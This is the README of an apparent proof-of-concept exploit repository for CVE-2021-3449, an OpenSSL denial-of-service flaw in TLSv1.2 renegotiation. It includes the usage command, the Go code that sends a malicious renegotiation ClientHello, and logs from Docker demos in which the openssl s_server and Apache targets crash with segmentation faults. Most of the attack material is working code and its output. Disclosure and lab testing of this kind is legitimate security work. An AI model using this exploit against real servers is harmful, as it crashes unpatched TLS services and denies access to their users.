# CVE-2021-3449 PoC exploit

Usage: `go run . -host hostname:port`

This program implements a proof-of-concept exploit of CVE-2021-3449
affecting OpenSSL servers pre-1.1.1k if TLSv1.2 secure renegotiation is accepted.

It connects to a TLSv1.2 server and immediately initiates an RFC 5746 "secure renegotiation".
The attack involves a maliciously-crafted `ClientHello` that causes the server to crash
by causing a NULL pointer dereference (Denial-of-Service).

## References

- [OpenSSL security advisory](https://www.openssl.org/news/secadv/20210325.txt)
- [cve.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3449)
- [Ubuntu security notice](https://ubuntu.com/security/notices/USN-4891-1) (USN-4891-1)
- [Debian security tracker](https://security-tracker.debian.org/tracker/CVE-2021-3449)
- [Red Hat CVE entry](https://access.redhat.com/security/cve/CVE-2021-3449)

> This issue was reported to OpenSSL on 17th March 2021 by Nokia. The fix was
> developed by Peter Kästle and Samuel Sapalski from Nokia.

## Exploit

`main.go` is a tiny script that connects to a TLS server, forces a renegotiation, and disconnects.

The exploit code was injected into a bundled version of the Go 1.14.15 `encoding/tls` package.
You can find it in `handshake_client.go:115`. The logic is self-explanatory.

```go
// CVE-2021-3449 exploit code.
if hello.vers >= VersionTLS12 {
    if c.handshakes == 0 {
        println("sending initial ClientHello")
        hello.supportedSignatureAlgorithms = supportedSignatureAlgorithms
    } else {
        // OpenSSL pre-1.1.1k runs into a NULL-pointer dereference
        // if the supported_signature_algorithms extension is omitted,
        // but supported_signature_algorithms_cert is present.
        println("sending malicious ClientHello")
        hello.supportedSignatureAlgorithmsCert = supportedSignatureAlgorithms
    }
}
```

– [@terorie](https://github.com/terorie)

## Demo

The `demo/` directory holds configuration to patch various apps with a vulnerable version of OpenSSL.

It fetches OpenSSL 1.1.1j from the old versions archive, compiles it, and packs it into Docker containers for testing.

Requirements:
- OpenSSL (on the host)
- `build-essential` (Perl, GCC, Make)
- Docker

To clean up all demo resources, run `make clean`.

### OpenSSL simple server

The `openssl s_server` is a minimal TLS server implementation.

* `make demo-openssl`: Full run (port 4433)
* `make -C demo build-openssl`: Build target Docker image
* `make -C demo start-openssl`: Start target at port 4433
* `make -C demo stop-openssl`: Stop target

<details>
<summary>Logs</summary>

```
docker run -d -it --name cve-2021-3449-openssl --network host local/cve-2021-3449/openssl
a16c44f98a37b7e0c0777d3bd66456203de129fd23566d2141ef2bec9777be17
docker logs -f cve-2021-3449-openssl &
sleep 2
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Using default temp DH parameters
ACCEPT
make[1]: Leaving directory './demo'
sending initial ClientHello
connected
sending malicious ClientHello
-----BEGIN SSL SESSION PARAMETERS-----
MHUCAQECAgMDBALMqAQgaJhMWGYFh3BisNOgj+84zbLcYudeuED+9udOC1J+ykQE
MCsEnbW4i6S8iSkm7UWi8fU6YA/Z2fVZ/4HGpOzcDPD//wVJEqD2+q7LcLam9vR8
maEGAgRgXpdIogQCAhwgpAYEBAEAAAA=
-----END SSL SESSION PARAMETERS-----
Shared ciphers:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA
Signature Algorithms: RSA-PSS+SHA256:ECDSA+SHA256:Ed25519:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA384:ECDSA+SHA512:RSA+SHA1:ECDSA+SHA1
Shared Signature Algorithms: RSA-PSS+SHA256:ECDSA+SHA256:Ed25519:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA384:ECDSA+SHA512:RSA+SHA1:ECDSA+SHA1
Supported Elliptic Curve Point Formats: uncompressed
Supported Elliptic Groups: X25519:P-256:P-384:P-521
Shared Elliptic groups: X25519:P-256:P-384:P-521
CIPHER is ECDHE-RSA-CHACHA20-POLY1305
Secure Renegotiation IS supported

Program received signal SIGSEGV, Segmentation fault.
0x00007f668bd89283 in tls12_shared_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#0  0x00007f668bd89283 in tls12_shared_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#1  0x00007f668bd893cd in tls1_set_shared_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#2  0x00007f668bd89fe3 in tls1_process_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#3  0x00007f668bd8a110 in tls1_set_server_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#4  0x00007f668bd824a2 in tls_early_post_process_client_hello () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#5  0x00007f668bd84d55 in tls_post_process_client_hello () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#6  0x00007f668bd8522f in ossl_statem_server_post_process_message () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#7  0x00007f668bd710e1 in read_state_machine () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#8  0x00007f668bd7199d in state_machine () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#9  0x00007f668bd71c4e in ossl_statem_accept () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#10 0x00007f668bd493ab in ssl3_read_bytes () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#11 0x00007f668bd504ec in ssl3_read_internal () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#12 0x00007f668bd50595 in ssl3_read () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#13 0x00007f668bd5ae5c in ssl_read_internal () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#14 0x00007f668bd5af5b in SSL_read () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#15 0x000055aa5a10f209 in sv_body ()
#16 0x000055aa5a1302ec in do_server ()
#17 0x000055aa5a114815 in s_server_main ()
#18 0x000055aa5a0f9395 in do_cmd ()
#19 0x000055aa5a0f9ee1 in main ()
malicious handshake failed, exploit might have worked
make[1]: Entering directory './demo'
docker container rm -f cve-2021-3449-openssl || true
cve-2021-3449-openssl
make[1]: Leaving directory './demo'
```

</details>

### Apache2 httpd

Apache2 `httpd` web server with default configuration is vulnerable.

* `make demo-apache`: Full run (port 443)
* `make -C demo build-apache`: Build target Docker image
* `make -C demo start-apache`: Start target at port 443
* `make -C demo stop-apache`: Stop target

Thank you to [@binarytrails](https://github.com/binarytrails) for the contribution.

<details>
<summary>Logs</summary>

```
docker run -d -it --name cve-2021-3449-apache2 --network host local/cve-2021-3449/apache2
0bf38dd8ab721f0ae3713448d2a28050b6e7d11fa7e3174b6ec9b1bbcfa124c8
docker logs -f cve-2021-3449-apache2 &
sleep 10
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set the 'ServerName' directive globally to suppress this message
[Sat Mar 27 02:54:28.162865 2021] [ssl:info] [pid 18:tid 140433267538880] AH01914: Configuring server localhost:443 for SSL protocol
[Sat Mar 27 02:54:28.162969 2021] [ssl:debug] [pid 18:tid 140433267538880] ssl_engine_init.c(1705): AH: Init: (localhost:443) mod_md support is unavailable.
[Sat Mar 27 02:54:28.163215 2021] [ssl:debug] [pid 18:tid 140433267538880] ssl_engine_init.c(492): AH01893: Configuring TLS extension handling
[Sat Mar 27 02:54:28.163507 2021] [ssl:debug] [pid 18:tid 140433267538880] ssl_util_ssl.c(470): AH02412: [localhost:443] Cert does not match for name 'localhost' [subject: CN=70eacea1d8ae / issuer: CN=70eacea1d8ae / serial: 53C9ED43796FC732B0020985EC25DFD0E5C064E2 / notbefore: Mar 27 02:34:30 2021 GMT / notafter: Mar 25 02:34:30 2031 GMT]
[Sat Mar 27 02:54:28.163522 2021] [ssl:warn] [pid 18:tid 140433267538880] AH01909: localhost:443:0 server certificate does NOT include an ID which matches the server name
[Sat Mar 27 02:54:28.163530 2021] [ssl:info] [pid 18:tid 140433267538880] AH02568: Certificate and private key localhost:443:0 configured from /etc/ssl/certs/ssl-cert-snakeoil.pem and /etc/ssl/private/ssl-cert-snakeoil.key
[Sat Mar 27 02:54:28.172843 2021] [ssl:info] [pid 19:tid 140433267538880] AH01914: Configuring server localhost:443 for SSL protocol
[Sat Mar 27 02:54:28.172876 2021] [ssl:debug] [pid 19:tid 140433267538880] ssl_engine_init.c(1705): AH: Init: (localhost:443) mod_md support is unavailable.
[Sat Mar 27 02:54:28.173058 2021] [ssl:debug] [pid 19:tid 140433267538880] ssl_engine_init.c(492): AH01893: Configuring TLS extension handling
[Sat Mar 27 02:54:28.173262 2021] [ssl:debug] [pid 19:tid 140433267538880] ssl_util_ssl.c(470): AH02412: [localhost:443] Cert does not match for name 'localhost' [subject: CN=70eacea1d8ae / issuer: CN=70eacea1d8ae / serial: 53C9ED43796FC732B0020985EC25DFD0E5C064E2 / notbefore: Mar 27 02:34:30 2021 GMT / notafter: Mar 25 02:34:30 2031 GMT]
[Sat Mar 27 02:54:28.173272 2021] [ssl:warn] [pid 19:tid 140433267538880] AH01909: localhost:443:0 server certificate does NOT include an ID which matches the server name
[Sat Mar 27 02:54:28.173276 2021] [ssl:info] [pid 19:tid 140433267538880] AH02568: Certificate and private key localhost:443:0 configured from /etc/ssl/certs/ssl-cert-snakeoil.pem and /etc/ssl/private/ssl-cert-snakeoil.key
[Sat Mar 27 02:54:28.174072 2021] [mpm_event:notice] [pid 19:tid 140433267538880] AH00489: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1j configured -- resuming normal operations
[Sat Mar 27 02:54:28.174105 2021] [core:notice] [pid 19:tid 140433267538880] AH00094: Command line: '/usr/sbin/apache2'
make[1]: Leaving directory './demo'
sending initial ClientHello
connected
sending malicious ClientHello
[Sat Mar 27 02:54:38.153327 2021] [ssl:info] [pid 21:tid 140433175750400] [client 127.0.0.1:46846] AH01964: Connection to child 64 established (server localhost:443)
[Sat Mar 27 02:54:38.153619 2021] [ssl:debug] [pid 21:tid 140433175750400] ssl_engine_kernel.c(2317): [client 127.0.0.1:46846] AH02043: SSL virtual host for servername localhost found
[Sat Mar 27 02:54:38.155697 2021] [ssl:debug] [pid 21:tid 140433175750400] ssl_engine_kernel.c(2233): [client 127.0.0.1:46846] AH02041: Protocol: TLSv1.2, Cipher: ECDHE-RSA-CHACHA20-POLY1305 (256/256 bits)
[Sat Mar 27 02:54:38.155781 2021] [ssl:error] [pid 21:tid 140433175750400] [client 127.0.0.1:46846] AH02042: rejecting client initiated renegotiation
[Sat Mar 27 02:54:38.155837 2021] [ssl:debug] [pid 21:tid 140433175750400] ssl_engine_kernel.c(2317): [client 127.0.0.1:46846] AH02043: SSL virtual host for servername localhost found
malicious handshake failed, exploit might have worked: EOF
[Sat Mar 27 02:54:39.183129 2021] [core:notice] [pid 19:tid 140433267538880] AH00051: child pid 21 exit signal Segmentation fault (11), possible coredump in /etc/apache2
make[1]: Entering directory './demo'
docker container rm -f cve-2021-3449-apache2 || true
cve-2021-3449-apache2
make[1]: Leaving directory './demo'
```

</details>

## Copyright

This repository bundles the `encoding/tls` package of the Go programming language.

```
// Copyright 2009 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.
```
